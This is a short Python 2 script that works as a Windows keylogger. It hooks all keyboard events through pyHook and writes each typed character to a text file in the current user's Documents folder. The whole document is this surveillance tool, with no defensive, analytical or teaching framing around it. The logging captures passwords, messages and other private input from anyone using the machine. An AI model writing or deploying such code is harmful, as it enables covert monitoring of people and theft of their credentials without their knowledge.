import pyHook, pythoncom, sys, logging, getpass, os

first_dir = 'C:\Users'
second_dir = getpass.getuser()
last_dir = '\Documents\keyloggeroutput.txt'

new_file_log = os.path.join(first_dir, second_dir + last_dir)
file_log = 'C:\Users\%username%\Documents\keyloggeroutput.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=new_file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    if chr(event.Ascii) in "ABCDEFGHIJKLMNOPQRSTUVWXYZ": print chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
